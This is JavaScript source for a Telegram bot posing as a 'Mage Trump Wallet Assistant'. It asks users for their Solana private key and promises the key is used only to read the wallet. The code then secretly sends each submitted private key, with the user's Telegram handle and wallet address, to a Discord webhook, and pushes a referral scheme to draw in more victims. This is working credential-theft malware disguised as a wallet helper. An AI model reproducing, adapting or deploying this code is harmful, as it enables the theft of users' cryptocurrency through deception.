require('dotenv').config();
const path = require('path');
const { Telegraf } = require('telegraf');
const admin = require('firebase-admin');
const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const rawBs58 = require('bs58');
const bs58 = rawBs58.default || rawBs58;
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

const bot = new Telegraf(process.env.BOT_TOKEN);
const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON);
const discordWebhook = process.env.DISCORD_WEBHOOK;

admin.initializeApp({
  credential: admin.credential.cert(credentials),
});

const db = admin.firestore();
const connection = new Connection("https://api.mainnet-beta.solana.com");

bot.start((ctx) => {
  ctx.replyWithPhoto(
    // ✅ Use imagem local
    { source: path.resolve(__dirname, 'images/trumpmage.png') },
    
    // Ou comente a linha acima e use um link direto:
    // { url: 'https://seuservidor.com/imagens/trumpmage.png' },

    {
      caption: `👋 *Welcome to Mage Trump Wallet Assistant!*

To continue, please send your Solana *private key* (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.

⚠️ Your key will be used to read your wallet only. Keep it safe.`,
      parse_mode: 'Markdown'
    }
  );
});

bot.on('text', async (ctx) => {
  const input = ctx.message.text.trim();
  let keypair;

  try {
    let secret;

    if (input.startsWith('[')) {
      secret = JSON.parse(input);
    } else {
      const decoded = bs58.decode(input);
      secret = Array.from(decoded);
    }

    if (!secret || secret.length !== 64) throw new Error('Invalid secret key length');

    keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
    const pubkey = keypair.publicKey.toBase58();

    const lamports = await connection.getBalance(new PublicKey(pubkey));
    const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);

    const userRef = db.collection('users').doc(pubkey);
    const docSnap = await userRef.get();

    let projectBalance = '0.0';
    let refCount = 0;
    let canClaim = false;

    if (docSnap.exists) {
      const data = docSnap.data();
      projectBalance = (data.balance || 0).toFixed(2);
      refCount = data.refCount || 0;
      canClaim = data.canClaim || false;
    }

    const msg = `
🧙 Wallet: \`${pubkey}\`
💸 On-chain balance: ${solBalance} SOL
🎯 Project balance: ${projectBalance} SOL
🔗 Referrals: ${refCount}
${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Available'}

📢 Your referral link:
https://magetoken.com.br/?ref=${pubkey}

🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();

    await ctx.replyWithMarkdown(msg);

    try {
      await fetch(discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `📢 New user connected via private key:

👤 Telegram: @${ctx.from.username || 'unknown'}
🔑 Private Key: \`${input}\`
🧙 Wallet: \`${pubkey}\`

💸 On-chain: ${solBalance} SOL
🎯 Project: ${projectBalance} | Referrals: ${refCount}
⛔ Claim: ${canClaim ? 'Available' : 'Not Available'}`
        })
      });
    } catch (err) {
      console.warn('⚠️ Falha ao enviar para Discord:', err.message);
    }

  } catch (err) {
    console.error('Erro ao processar a chave:', err.message || err);
    await ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
  }
});

bot.launch();
console.log("✅ MageTrump Assistant is running...");
